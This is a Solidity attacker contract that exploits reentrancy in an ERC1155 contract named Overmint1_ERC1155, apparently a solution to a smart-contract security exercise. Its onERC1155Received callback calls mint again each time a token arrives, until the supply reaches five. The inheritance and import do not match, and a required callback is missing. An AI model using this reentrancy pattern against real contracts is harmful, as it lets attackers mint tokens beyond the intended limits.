// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Overmint1_ERC1155} from "./Overmint1_ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Buyer is ERC1155Receiver {
    Overmint1_ERC1155 src;

    uint8 id = 0;

    constructor(address _src) {
        src = Overmint1_ERC1155(_src);
    }

    function attack() public {
        src.mint(id, "");
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        if (src.totalSupply() < 5) {
            id++;
            src.mint(id, "");
        }
        return this.onERC1155Received.selector;
    }
}
